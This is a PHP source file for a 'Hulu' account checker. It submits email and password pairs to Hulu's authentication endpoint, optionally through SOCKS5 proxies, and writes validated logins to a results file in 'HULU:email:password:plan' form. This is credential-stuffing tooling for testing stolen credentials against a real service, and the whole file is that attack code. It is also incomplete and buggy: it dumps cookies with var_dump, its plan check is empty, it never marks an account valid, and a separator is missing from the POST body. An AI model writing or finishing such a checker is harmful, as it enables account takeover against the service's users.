<?php

namespace Markoftw\AccountChecker;

use Markoftw\AccountChecker\Webrequests\Webrequests as Webrequests;
use Markoftw\AccountChecker\Functions\Functions as Functions;

class Hulu extends Webrequests
{
    private $_LOGIN_URL = "https://secure.hulu.com/account/signin";
    private $_LOGIN_API = "https://secure.hulu.com/account/authenticate";
    private $_LOGOUT_URL = "https://secure.hulu.com/logout";
    private $_PROFILE_URL = "https://secure.hulu.com/account";

    private $_PROXY,
        $_TYPE,
        $_EMAIL,
        $_PASSWORD,
        $_FILE,
        $_VALID,
        $_PLAN,
        $_TIMER,
        $_RESULTS;

    private static $_INSTANCE;
    private static $_SERVICE = "hulu";

    public function __construct()
    {
        self::$_INSTANCE = new Webrequests();
        $this->_VALID = "FALSE";
        $this->_RESULTS = [];
        $this->_TIMER = Functions::timer();
    }

    /**
     * Set curl proxy.
     *
     * @param $proxy
     * @param string $type
     * @return $this
     */
    public function proxy($proxy, $type = "SOCKS5")
    {
        $this->_PROXY = $proxy;
        $this->_TYPE = $type;
        $this->_RESULTS['PROXY'] = $proxy;
        $this->_RESULTS['TYPE'] = $type;
        return $this;
    }

    public function check($email, $password)
    {
        $this->_EMAIL = $email;
        $this->_PASSWORD = $password;
        $this->_RESULTS['EMAIL'] = $email;
        $this->_RESULTS['PASSWORD'] = $password;

        // set proxy to empty for request()
        if (!empty($this->_PROXY)) {
            $use_proxy = true;
            $proxy = array($ip = $this->_PROXY, $type = $this->_TYPE);
        } else {
            $use_proxy = false;
            $proxy = array("", "");
        }

        self::$_INSTANCE->request(self::$_SERVICE, $this->_LOGOUT_URL, $use_proxy, $proxy);

        $x = rand(1,60);
        $y = rand(1,10);

        $post_data = "redirect_to=http://secure.hulu.com:443/&check_ck=1&from=web&login=". $email ."&password=" . $password . "x=".$x."&y=" . $y;

        $post_body = self::$_INSTANCE->request(self::$_SERVICE, $this->_LOGIN_API, $use_proxy, $proxy, true, $post_data);

        preg_match_all('/^Cookie:\s*([^;]*)/mi', $post_body, $match);

        var_dump($match);


        $this->_TIMER = round((Functions::timer() - $this->_TIMER), 4);
        $this->_RESULTS['LOADTIME'] = $this->_TIMER;

        return $this;
    }

    public function plan()
    {
        if (!empty($this->_PROXY)) {
            $use_proxy = true;
            $proxy = array($ip = $this->_PROXY, $type = $this->_TYPE);
        } else {
            $use_proxy = false;
            $proxy = array("", "");
        }

        return $this;
    }

    /**
     * Saving results to file.
     *
     * @param string $file
     * @return $this
     */
    public function save($file = "results_hulu.txt")
    {
        if (!file_exists($file) || !is_writable($file)) {
            echo '<br/>' . $file . ' missing or not writable.<br/>';
            exit;
        }
        $this->_FILE = $file;
        $this->_RESULTS['COMPLETED'] = $this->_FILE;

        if ($this->_VALID != "FALSE") {
            $write_file = fopen($this->_FILE, "w") or die("Unable to open file!");
            $txt = "HULU:" . $this->_EMAIL . ":" . $this->_PASSWORD . ":" . $this->_VALID . "\n";
            fwrite($write_file, $txt);
            fclose($write_file);
        }

        return $this;
    }

    /**
     * Return array.
     *
     * @return mixed
     */
    public function get()
    {
        return Functions::cleanKeys($this->_RESULTS);
    }

    /**
     * Return JSON.
     *
     * @return string
     */
    public function json()
    {
        return Functions::toJson(Functions::cleanKeys($this->_RESULTS));
    }

}
